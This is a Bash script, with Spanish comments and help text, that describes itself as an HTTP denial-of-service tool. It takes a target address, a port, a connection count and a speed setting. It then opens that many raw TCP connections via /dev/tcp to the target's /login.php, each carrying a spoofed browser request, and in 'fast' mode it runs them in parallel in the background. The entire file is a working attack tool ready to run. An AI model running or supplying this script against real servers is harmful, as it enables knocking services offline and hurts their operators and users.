#!/bin/bash

# Definiciones de color
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Función para mostrar el mensaje de ayuda

show_help() {
  echo
  echo -e "${BLUE}Uso: $0 [TARGET] [PORT] [NUM_CONNECTIONS] [SLEEP_TIME]${NC}"
  echo
  echo -e "${GREEN}TARGET${NC}            La dirección del objetivo (por ejemplo, 10.1.10.35)"
  echo -e "${GREEN}PORT${NC}              El puerto en el que está corriendo el servidor (normalmente 80 o 443)"
  echo -e "${GREEN}NUM_CONNECTIONS${NC}   Número de conexiones a mantener abiertas"
 # echo -e "${GREEN}SLEEP_TIME${NC}       Tiempo en segundos entre cada byte enviado"
  echo -e  "${GREEN}SPEED${NC}            Velocidad de ejecución del script 'slow' o 'fast'"
  echo
  echo -e "${YELLOW}Ejemplo: $0 10.1.10.35 80 1000 slow${NC}"
  echo
  exit 1
}

# Verificar el número de argumentos
if [ $# -ne 4 ]; then
  show_help
fi

# Configuraciones por defecto si se pasan argumentos
TARGET=$1
PORT=$2
NUM_CONNECTIONS=$3
SPEED=$4

echo -e "${YELLOW}Se va a ejecutar el script de requests HTTP DoS${NC}"

#Realizar el ataque
for i in $(seq 1 $NUM_CONNECTIONS)
do
  if (( $i % (NUM_CONNECTIONS / 10) == 0 )); then
    PERCENTAGE=$(( (i * 100) / NUM_CONNECTIONS ))
    echo -e "${GREEN}Avance: $PERCENTAGE% del proceso completado${NC}"
  fi
  if [ "$SPEED" == "fast" ]; then
  {
    exec 3<>/dev/tcp/$TARGET/$PORT
    echo -e "GET /login.php HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,es-CR;q=0.5\r\nConnection: keep-alive\r\nHost: $TARGET\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0\r\n\r\n" >&3
    exec 3<&-
    exec 3>&-
  } &
  elif [ "$SPEED" == "slow" ]; then
    exec 3<>/dev/tcp/$TARGET/$PORT
    echo -e "GET /login.php HTTP/1.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,es-CR;q=0.5\r\nConnection: keep-alive\r\nHost: $TARGET\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0\r\n\r\n" >&3
    exec 3<&-
    exec 3>&-
  else
  echo -e "${RED}Error: SPEED debe ser 'slow' o 'fast'.${NC}"
  show_help
  fi
done

echo -e "${BLUE}Se generaron $NUM_CONNECTIONS conexiones en total...${NC}"

exit 0
